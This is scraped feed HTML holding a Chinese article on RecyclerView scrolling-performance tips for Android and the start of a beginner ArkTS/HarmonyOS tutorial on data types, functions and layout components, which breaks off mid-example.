.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>​</p>
<h2 data-id="heading-0">RecyclerView 滑动卡顿？教你几招让列表“丝般顺滑”</h2>
<p>在 Android 开发中，RecyclerView 是我们最熟悉的“老伙计”，也是最容易出性能问题的组件。你是否遇到过这种情况：手指在屏幕上一划，列表却像幻灯片一样一帧一帧地跳？Logcat 里不停弹出 <code>Skipped 60 frames! The application may be doing too much work on its main thread.</code>？</p>
<p>对于追求用户体验的应用来说（特别是 TV 端或者低端机型），掉帧是绝对不能接受的。今天我们不谈源码分析，只谈<strong>实战中能直接提升 FPS 的优化手段</strong>。</p>
<h4 data-id="heading-1">1. 别在 <code>onBindViewHolder</code> 里“通过苦力”</h4>
<p>这是新手最容易犯的错。<code>onBindViewHolder</code> 每秒可能被调用几十次，这里面的代码必须<strong>快如闪电</strong>。</p>
<ul>
<li>
<p><strong>错误做法</strong>：</p>
<ul>
<li>在里面设置 <code>OnClickListener</code>（每次 bind 都 new 一个对象，内存抖动）。</li>
<li>进行复杂的数学计算或日期格式化（<code>SimpleDateFormat</code> 极其耗时）。</li>
<li>加载图片时没有指定大小。</li>
</ul>
</li>
<li>
<p><strong>优化方案</strong>：</p>
<ul>
<li><strong>点击事件移到 <code>onCreateViewHolder</code></strong> 或者 ViewHolder 的 <code>init</code> 块中。</li>
<li><strong>数据预处理</strong>：把日期格式化、字符串拼接等逻辑放到 ViewModel 或数据层处理，传给 Adapter 的应该是直接能显示的 String。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-2">2. 告别 <code>notifyDataSetChanged()</code>，拥抱 <code>DiffUtil</code></h4>
<p>如果你还在无脑调用 <code>notifyDataSetChanged()</code>，请立刻停止。这个方法会强制重绘整个屏幕可见的 Item，哪怕你只是改了一个 TextView 的文字。</p>
<ul>
<li><strong>神器：DiffUtil / ListAdapter</strong> <code>DiffUtil</code> 是 Google 官方推出的工具，它能计算出新旧数据集的最小差异。 更推荐直接使用 <strong><code>ListAdapter</code></strong>（继承自 RecyclerView.Adapter），它内部封装了 AsyncListDiffer。</li>
</ul>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 使用 ListAdapter 后的刷新</span>
adapter<span class="hljs-selector-class">.submitList</span>(newList) 
<span class="hljs-comment">// 它会自动计算差异，只刷新变化的 Item，甚至伴随优雅的动画</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>这不仅能提升性能，还能解决“刷新闪烁”的问题。</p>
<h4 data-id="heading-3">3. 布局优化：减少层级，拒绝过度绘制</h4>
<p>Item 的布局越复杂，测量（Measure）和布局（Layout）的时间就越长。</p>
<ul>
<li><strong>扁平化</strong>：如果你的 Item 布局里有 <code>LinearLayout</code> 嵌套 <code>LinearLayout</code>，尝试用 <code>ConstraintLayout</code> 把它拍扁。</li>
<li><strong>但是...</strong> ：对于特别简单的 Item，<code>ConstraintLayout</code> 的构建成本反而比 <code>FrameLayout/LinearLayout</code> 高。如果只是简单的图文混排，不需要复杂的约束，简单的 ViewGroup 性能更好。</li>
<li><strong>移除背景色</strong>：检查 Item 根布局是否有不必要的背景色（特别是白色背景），这会导致 GPU 过度绘制。</li>
</ul>
<h4 data-id="heading-4">4. 甚至连 XML 都不用？（高级技巧）</h4>
<p>如果是极致性能要求（比如即时通讯的消息列表），解析 XML 布局本身也是一种消耗。 有些大厂（如 Telegram）会直接用 Java/Kotlin 代码手写 View，或者使用 <code>AsyncLayoutInflater</code> 在子线程异步加载布局。 <em>注：普通项目不建议这么卷，维护成本太高。</em></p>
<h4 data-id="heading-5">5. 巧用缓存：<code>setItemViewCacheSize</code></h4>
<p>RecyclerView 有两级缓存：</p>
<ol>
<li><strong>Scrap/Attached</strong>: 屏幕内的。</li>
<li><strong>CachedViews</strong>: 刚滑出屏幕的（默认是 2 个）。</li>
<li><strong>RecycledViewPool</strong>: 真正的复用池。</li>
</ol>
<p>如果你发现回滑（往回滚）的时候会卡顿，说明 <code>onBindViewHolder</code> 被重新触发了。你可以适当调大 CacheSize，以空间换时间：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 将刚滑出屏幕的缓存数量从默认的 2 增加到 5 或 10</span>
recyclerView<span class="hljs-selector-class">.setItemViewCacheSize</span>(<span class="hljs-number">10</span>)
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>这样，当你快速回滚时，这 10 个 Item 不需要重新 bind 数据，直接显示。</p>
<h4 data-id="heading-6">6. 嵌套 RecyclerView 的大杀器：共享 ViewPool</h4>
<p>这是很多复杂页面（比如类似 Play Store 或 Netflix 的页面，垂直列表中嵌套水平列表）卡顿的元凶。</p>
<p>默认情况下，每个嵌套的子 RecyclerView 都有自己的 ViewPool。当用户垂直滑动时，每一行的子 RecyclerView 都在不停地创建和销毁 ViewHolder。</p>
<p><strong>优化方案</strong>：让所有子 RecyclerView 共用同一个 <code>RecycledViewPool</code>。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 在外层 Adapter 中</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> viewPool = RecyclerView.RecycledViewPool()

<span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onBindViewHolder</span><span class="hljs-params">(holder: <span class="hljs-type">ViewHolder</span>, position: <span class="hljs-type">Int</span>)</span></span> {
    <span class="hljs-comment">// ...</span>
    holder.innerRecyclerView.setRecycledViewPool(viewPool)
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>这能极大地减少内存波动和创建 View 的开销。</p>
<h4 data-id="heading-7">7. 图片加载的“防抖”</h4>
<p>如果列表中有大量高清大图，滑动时加载图片会抢占 CPU 资源。 我们可以监听 RecyclerView 的滑动状态：</p>
<ul>
<li><strong>滑动时（SCROLL_STATE_FLING）</strong> ：暂停图片加载框架（Glide/Coil）的任务。</li>
<li><strong>静止时（SCROLL_STATE_IDLE）</strong> ：恢复加载。</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin">recyclerView.addOnScrollListener(<span class="hljs-keyword">object</span> : RecyclerView.OnScrollListener() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onScrollStateChanged</span><span class="hljs-params">(recyclerView: <span class="hljs-type">RecyclerView</span>, newState: <span class="hljs-type">Int</span>)</span></span> {
        <span class="hljs-keyword">if</span> (newState == RecyclerView.SCROLL_STATE_IDLE) {
            Glide.with(context).resumeRequests()
        } <span class="hljs-keyword">else</span> {
            Glide.with(context).pauseRequests()
        }
    }
})
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-8">8. 简单的固定高度：<code>setHasFixedSize(true)</code></h4>
<p>这可能是最简单的一行代码优化。如果你的列表 Item 高度是固定的（不会因为数据内容变化而忽大忽小），请务必设置：</p>
<pre><code class="hljs language-arduino" lang="arduino">recyclerView.<span class="hljs-built_in">setHasFixedSize</span>(<span class="hljs-literal">true</span>)
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>这告诉 RecyclerView：“我的 Item 大小不会变，你在重新布局的时候不需要重新计算我的宽高。”这能避免大量的重复测量工作。</p>
<h4 data-id="heading-9">总结</h4>
<p>优化 RecyclerView 其实就是一场<strong>与 16ms（60fps）的赛跑</strong>。</p>
<ol>
<li><strong>逻辑层面</strong>：用 <code>DiffUtil</code> 替代全量刷新。</li>
<li><strong>代码层面</strong>：<code>onBind</code> 越轻越好。</li>
<li><strong>布局层面</strong>：减少层级，共用 Pool。</li>
<li><strong>配置层面</strong>：<code>setHasFixedSize</code>，调整 Cache。</li>
</ol>
<p>把这几点做到位，你的列表绝对能从“拖拉机”变成“磁悬浮”。</p>
<p>​</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[想要试试用ArkTS写出丝滑的鸿蒙软件吗？]]></title>    <link>https://juejin.cn/post/7603246733317029942</link>    <guid>https://juejin.cn/post/7603246733317029942</guid>    <pubDate>2026-02-05T14:49:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603246733317029942" data-draft-id="7602900131541516329" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="想要试试用ArkTS写出丝滑的鸿蒙软件吗？"/> <meta itemprop="keywords" content="HarmonyOS"/> <meta itemprop="datePublished" content="2026-02-05T14:49:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="代码飞一会儿"/> <meta itemprop="url" content="https://juejin.cn/user/555695627842490"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            想要试试用ArkTS写出丝滑的鸿蒙软件吗？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/555695627842490/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    代码飞一会儿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T14:49:17.000Z" title="Thu Feb 05 2026 14:49:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ArkTS 是鸿蒙应用的开发语言。它在保持 TypeScript基本语法风格的基础上，通过规范强化静态检查和分析，提升代码健壮性。而ArkUI 是一套构建分布式应用界面的声明式 UI 开发框架，通过简洁的语法、丰富的组件、实时预览工具，提升应用界面开发效率。</p>
<blockquote>
<p>以下内容假设读者有typescript和JavaScript基础。</p>
</blockquote>
<h2 data-id="heading-0">一、数据类型</h2>
<ol>
<li>字符型：string</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">let</span> <span class="hljs-attr">a</span>:<span class="hljs-built_in">string</span> = <span class="hljs-string">'hello'</span>
</code></pre>
<ol start="2">
<li>数字型：number</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">let</span> <span class="hljs-attr">b</span>:<span class="hljs-built_in">number</span> = <span class="hljs-number">10</span>
</code></pre>
<ol start="3">
<li>布尔型：boolean</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">let</span> <span class="hljs-attr">c</span>:<span class="hljs-built_in">boolean</span> = <span class="hljs-literal">true</span>
</code></pre>
<p>总结：let 变量名:数据类型 = 值</p>
<blockquote>
<p>使用console.log(变量名)，可以打印变量。</p>
</blockquote>
<h2 data-id="heading-1">二、数组：一次性存储多个相同类型数据</h2>
<p>        使用：let 数组名:类型名[] = [数据1,数据2,数据3,......]</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">let</span> <span class="hljs-title class_">Narray</span>:<span class="hljs-built_in">number</span>[] = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>]
<span class="hljs-keyword">let</span> <span class="hljs-title class_">Sarray</span>:<span class="hljs-built_in">string</span>[] = [<span class="hljs-string">'一'</span>,<span class="hljs-string">'one'</span>,<span class="hljs-string">'二'</span>,<span class="hljs-string">'two'</span>]
<span class="hljs-keyword">let</span> <span class="hljs-title class_">Barray</span>:<span class="hljs-built_in">boolean</span>[]=[<span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>]
</code></pre>
<p>数组引用：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-title class_">Narray</span>[<span class="hljs-number">0</span>]
<span class="hljs-title class_">Sarray</span>[<span class="hljs-number">1</span>]
<span class="hljs-title class_">Barray</span>[<span class="hljs-number">3</span>]
</code></pre>
<h2 data-id="heading-2">三、对象：一次性存储多个不同类型数据</h2>
<p>步骤：（1）定义接口：interface 接口名={属性名:属性数据类型,……}</p>
<p>            （2）使用接口定义对象：let 对象名:接口名 ={属性名:属性值,……}</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">interface</span>  demo{
  <span class="hljs-attr">name</span>:<span class="hljs-built_in">string</span>
  <span class="hljs-attr">age</span>:<span class="hljs-built_in">number</span>
}
<span class="hljs-keyword">let</span> <span class="hljs-attr">info</span>:demo ={
  <span class="hljs-attr">name</span>:<span class="hljs-string">'Bob'</span>,
  <span class="hljs-attr">age</span>:<span class="hljs-number">10</span>
}
</code></pre>
<p>调用：</p>
<pre><code class="hljs language-ts" lang="ts">info.<span class="hljs-property">name</span>
info.<span class="hljs-property">age</span>
</code></pre>
<blockquote>
<p>如果调用整个对象，只会显示对象类型，不会显示值</p>
</blockquote>
<h2 data-id="heading-3">四、函数：封装重复性代码提高效率</h2>
<p>步骤（1）定义函数：function 函数名(形式参数列表) {函数体}</p>
<blockquote>
<p>形式参数列表形式：形式参数1:数据类型,形式参数2:数据类型……</p>
<p>函数可以没有形式参数</p>
<p>函数体可以没有返回值</p>
</blockquote>
<p>        （2）使用函数：函数名(实际参数列表)</p>
<p>定义示例：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">function</span> <span class="hljs-title function_">addNumber</span>(<span class="hljs-params">first:<span class="hljs-built_in">number</span>,second:<span class="hljs-built_in">number</span></span>){
  <span class="hljs-keyword">return</span> first+second
}
</code></pre>
<p>调用示例：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-title function_">addNumber</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)
</code></pre>
<p>没有形式参数和返回值的函数：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">function</span> <span class="hljs-title function_">printInfo</span>(<span class="hljs-params"/>){
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'日志打印'</span>)
}
<span class="hljs-title function_">printInfo</span>()
</code></pre>
<p>箭头函数形式：let 函数名 = (形式参数列表)=&gt; {函数体}</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">let</span> <span class="hljs-title function_">addNumber2</span> = (<span class="hljs-params">first:<span class="hljs-built_in">number</span>,second:<span class="hljs-built_in">number</span></span>) =&gt; { 
  <span class="hljs-keyword">return</span> first + second 
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">addNumber2</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>).<span class="hljs-title function_">toString</span>())
</code></pre>
<h2 data-id="heading-4">五、组件</h2>




















<table><thead><tr><th>分类</th><th>容器组件</th><th>内容组件</th></tr></thead><tbody><tr><td>使用</td><td>组件名(){}</td><td>组件名()</td></tr><tr><td>示例</td><td>Column(){}//纵向排列组件<br/>Row(){}//横向排列组件</td><td>Text('内容')</td></tr></tbody></table>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Index</span> {

  <span class="hljs-comment">//build里面要有唯一容器根组件</span>
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
      <span class="hljs-title class_">Column</span>(){
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">'一'</span>)
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">'二'</span>)
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">'三'</span>)
      }
  }
}
</code></pre>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a24f078b48544e6aa9e3fe53678f5f9d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB6aOe5LiA5Lya5YS_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770907757&amp;x-signature=YygU%2F3BgGzgSZHhtEOlsKtSMrs0%3D" alt="2026-01-28-17-48-38-image.png" loading="lazy"/></p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Index</span> {

  <span class="hljs-comment">//build里面要有唯一容器根组件</span>
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
      <span class="hljs-title class_">Row</span>(){
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">'一'</span>)
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">'二'</span>)
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">'三'</span>)
      }
  }
}
</code></pre>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4cfbbe7e5084425a80517a7431beacfc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB6aOe5LiA5Lya5YS_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770907757&amp;x-signature=IQu1fREsHH7N8W7%2FEqnsZw89pho%3D" alt="2026-01-28-17-49-49-image.png" loading="lazy"/></p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Index</span> {

  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>(){
      <span class="hljs-title class_">Column</span>(){
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">'一'</span>)
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">'二'</span>)
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">'三'</span>)
      }
      <span class="hljs-title class_">Row</span>(){
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">'一'</span>)
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">'二'</span>)
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">'三'</span>)
      }
    }
  }
}
</code></pre>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5280c8a35c842d981448db9b2e9b862~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB6aOe5LiA5Lya5YS_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770907757&amp;x-signature=VNdirMuOVlq39Jdo4QNzFwPfJRs%3D" alt="2026-01-28-17-50-46-image.png" loading="lazy"/></p>
<blockquote>
<p>build里面的容器根组件唯一</p>
</blockquote>
<h3 data-id="heading-5">（一）图像组件</h3>
<p>Image(文件路径)</p>
<p>本地：<code>$r('app.media.文件名')</code></p>
<blockquote>
<p>本地图片实际对应应放在<code>entry\src\main\resources\base\media</code>下</p>
</blockquote>
<p>网络：<code>http://xxx.xxx</code></p>
<p>示例代码：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Index</span> {

  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>(){
      <span class="hljs-title class_">Image</span>($r(<span class="hljs-string">'app.media.test'</span>))
        .<span class="hljs-title function_">width</span>(<span class="hljs-number">300</span>)
      <span class="hljs-title class_">Image</span>(<span class="hljs-string">'https://www.huawei.com/-/media/hcomponent-header/1.0.1.20251208095539/component/img/huawei_logo.png'</span>)
        .<span class="hljs-title function_">width</span>(<span class="hljs-number">200</span>)
    }
  }
}
</code></pre>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab97c55a9a09453fbdd96e905012effb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB6aOe5LiA5Lya5YS_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770907757&amp;x-signature=IE8ar90lGHF5Euui30QlZshZ70w%3D" alt="2026-01-29-16-16-11-image.png" loading="lazy"/></p>
<h3 data-id="heading-6">（二）列表组件</h3>
<p>示例代码：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Index</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'猜你喜欢'</span>)
        .<span class="hljs-title function_">fontColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">White</span>)
        .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
        .<span class="hljs-title function_">margin</span>({ <span class="hljs-attr">bottom</span>: <span class="hljs-number">10</span> })
      <span class="hljs-title class_">List</span>() {
        <span class="hljs-title class_">ListItem</span>() {
          <span class="hljs-title class_">Row</span>() {
            <span class="hljs-comment">//图片</span>
            <span class="hljs-title class_">Image</span>(<span class="hljs-string">'http://p2.music.126.net/CDhYcShQKH2VAMENuCxWWQ==/109951164166513349.jpg?param=130y130'</span>)
              .<span class="hljs-title function_">width</span>(<span class="hljs-number">80</span>)
              .<span class="hljs-title function_">border</span>({<span class="hljs-attr">radius</span>:<span class="hljs-number">8</span>})
              .<span class="hljs-title function_">margin</span>({<span class="hljs-attr">right</span>:<span class="hljs-number">10</span>})
            <span class="hljs-comment">//文字</span>
            <span class="hljs-title class_">Column</span>(){
              <span class="hljs-title class_">Text</span>(<span class="hljs-string">'悬溺'</span>)
                .<span class="hljs-title function_">fontColor</span>(<span class="hljs-string">'#f3f3f3'</span>)
                .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
                .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-number">700</span>)
                .<span class="hljs-title function_">margin</span>({<span class="hljs-attr">bottom</span>:<span class="hljs-number">15</span>})
              <span class="hljs-title class_">Row</span>(){
                <span class="hljs-title class_">Text</span>(<span class="hljs-string">'VIP'</span>)
                  .<span class="hljs-title function_">fontColor</span>(<span class="hljs-string">'#9a8e28'</span>)
                  .<span class="hljs-title function_">border</span>({<span class="hljs-attr">width</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">color</span>:<span class="hljs-string">'#9a8e28'</span>,<span class="hljs-attr">radius</span>:<span class="hljs-number">12</span>})
                  .<span class="hljs-title function_">padding</span>({<span class="hljs-attr">left</span>:<span class="hljs-number">5</span>,<span class="hljs-attr">right</span>:<span class="hljs-number">5</span>,<span class="hljs-attr">top</span>:<span class="hljs-number">3</span>,<span class="hljs-attr">bottom</span>:<span class="hljs-number">3</span>})
                  .<span class="hljs-title function_">margin</span>({<span class="hljs-attr">right</span>:<span class="hljs-number">10</span>})
                <span class="hljs-title class_">Text</span>(<span class="hljs-string">'葛东琪'</span>)
                  .<span class="hljs-title function_">fontColor</span>(<span class="hljs-string">'#696969'</span>)
              }
              .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)<span class="hljs-comment">//左对齐</span>
            }
            .<span class="hljs-title function_">layoutWeight</span>(<span class="hljs-number">1</span>)<span class="hljs-comment">//占用剩下所有空间</span>
            <span class="hljs-comment">//更多</span>
            <span class="hljs-title class_">Image</span>($r(<span class="hljs-string">'app.media.ic_more'</span>))
              .<span class="hljs-title function_">width</span>(<span class="hljs-number">24</span>)
              .<span class="hljs-title function_">fillColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">White</span>)<span class="hljs-comment">//svg填充颜色</span>
          }
          .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
